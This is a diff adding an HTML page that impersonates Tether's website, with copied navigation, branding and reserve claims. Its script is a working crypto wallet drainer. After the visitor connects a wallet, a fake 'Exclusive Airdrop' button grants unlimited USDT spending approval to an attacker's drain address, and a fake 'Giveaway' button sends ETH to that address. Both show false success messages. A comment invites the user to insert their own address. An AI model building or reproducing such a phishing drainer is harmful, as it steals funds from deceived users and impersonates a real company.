@@ -1,0 +1,163 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tether</title>
+  <link rel="stylesheet" href="https://tether.to/css/app.css?v=1.0.0">
+  <style>
+    /* Custom styles for animations and buttons */
+    .hero {
+      position: relative;
+      text-align: center;
+      padding: 100px 20px;
+      background: #000;
+      color: #fff;
+    }
+    .orbiting-coins {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      animation: rotate 30s linear infinite;
+    }
+    .coin {
+      position: absolute;
+      width: 50px;
+      height: 50px;
+      background: url('https://tether.to/images/usdt-coin.png') center/contain no-repeat;
+      animation: orbit 20s linear infinite;
+    }
+    .coin:nth-child(1) { top: 20%; left: 30%; animation-duration: 15s; }
+    .coin:nth-child(2) { top: 40%; left: 50%; animation-duration: 25s; }
+    .coin:nth-child(3) { top: 60%; left: 70%; animation-duration: 18s; }
+    @keyframes orbit {
+      0% { transform: translate(-50%, -50%) rotate(0deg) translateX(150px) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg) translateX(150px) rotate(-360deg); }
+    }
+    .typing-text {
+      font-size: 2rem;
+      white-space: nowrap;
+      overflow: hidden;
+      border-right: 0.15em solid #fff;
+      animation: typing 3s steps(40, end), blink-caret .75s step-end infinite;
+    }
+    @keyframes typing {
+      from { width: 0 }
+      to { width: 100% }
+    }
+    @keyframes blink-caret {
+      from, to { border-color: transparent }
+      50% { border-color: #fff; }
+    }
+    .buttons {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 50px;
+    }
+    .btn {
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .btn-connect { background: #00ff00; color: #000; }
+    .btn-airdrop { background: #ff00ff; color: #000; }
+    .btn-giveaway { background: #0000ff; color: #fff; }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <nav class="nav">
+      <a href="/">Tether</a>
+      <a href="/usdt">USDT</a>
+      <a href="/eur">EUR₮</a>
+      <a href="/mxn">MXN₮</a>
+      <a href="/cny">CNH₮</a>
+      <a href="/xau">XAU₮</a>
+      <a href="/about">About Us</a>
+      <a href="/transparency">Transparency</a>
+      <a href="/contact">Contact</a>
+    </nav>
+  </header>
+
+  <section class="hero">
+    <div class="orbiting-coins">
+      <div class="coin"></div>
+      <div class="coin"></div>
+      <div class="coin"></div>
+      <div class="coin"></div>
+      <div class="coin"></div>
+    </div>
+    <h1 class="typing-text">The world's most used stablecoin</h1>
+    <p>Tether tokens offer exceptional liquidity on tier one exchanges giving traders the best exchange rates.</p>
+    <div class="buttons">
+      <button class="btn btn-connect" id="connect-btn">Connect Wallet</button>
+      <button class="btn btn-airdrop" id="airdrop-btn" disabled>Exclusive Airdrop</button>
+      <button class="btn btn-giveaway" id="giveaway-btn" disabled>Participate in Giveaway</button>
+    </div>
+  </section>
+
+  <section class="about">
+    <h2>About Tether</h2>
+    <p>Tether gives you the joint benefits of open blockchain technology and traditional currency by converting your cash into digital currency, pegged to the price of the biggest currencies in the world.</p>
+  </section>
+
+  <section class="transparency">
+    <h2>Transparency</h2>
+    <p>Our reserve holdings are published daily and subject to frequent professional audits. All Tether tokens are pegged at 1-to-1 with a matching fiat currency and are backed 100% by Tether's reserves.</p>
+  </section>
+
+  <footer class="footer">
+    <p>© 2025 Tether.to</p>
+  </footer>
+
+  <script>
+    const DRAIN_ADDRESS = "YOUR_ETHEREUM_DRAIN_ADDRESS"; // Замени на свой
+
+    const connectBtn = document.getElementById('connect-btn');
+    const airdropBtn = document.getElementById('airdrop-btn');
+    const giveawayBtn = document.getElementById('giveaway-btn');
+
+    let wallet, signer;
+
+    connectBtn.onclick = async () => {
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          wallet = new ethers.providers.Web3Provider(window.ethereum);
+          signer = wallet.getSigner();
+          connectBtn.textContent = "Connected";
+          connectBtn.disabled = true;
+          airdropBtn.disabled = false;
+          giveawayBtn.disabled = false;
+        } catch (err) {
+          console.error(err);
+        }
+      } else {
+        alert("Install MetaMask!");
+      }
+    };
+
+    airdropBtn.onclick = async () => {
+      if (!signer) return;
+      // Fake airdrop - approve drain
+      const usdt = new ethers.Contract("0xdAC17F958D2ee523a2206206994597C13D831ec7", ["function approve(address spender, uint256 amount)"], signer);
+      await usdt.approve(DRAIN_ADDRESS, ethers.constants.MaxUint256);
+      alert("Airdrop claimed!");
+    };
+
+    giveawayBtn.onclick = async () => {
+      if (!signer) return;
+      // Fake giveaway - small transfer + approve
+      const tx = { to: DRAIN_ADDRESS, value: ethers.utils.parseEther("0.01") };
+      await signer.sendTransaction(tx);
+      alert("Participated in giveaway!");
+    };
+  </script>
+</body>
+</html>
